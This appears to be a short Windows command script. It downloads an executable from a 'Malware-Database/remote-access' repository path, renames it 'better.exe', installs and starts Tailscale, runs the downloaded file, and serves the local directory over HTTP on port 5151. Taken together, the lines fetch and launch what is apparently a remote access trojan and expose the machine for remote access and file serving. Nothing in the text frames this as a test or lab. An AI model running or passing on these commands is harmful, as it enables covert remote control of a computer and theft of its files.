curl https://gitea.com/cvmuser1000/Malware-Database/raw/branch/main/remote-access/skyhighsundaerat.exe --output better.exe
curl https://pkgs.tailscale.com/stable/tailscale-setup-1.76.6-amd64.msi --output a.msi
msiexec /i a.msi
timeout -c 20
"C:/Program Files/Tailscale/tailscale.exe" up
start better.exe
py -m http.server 5151
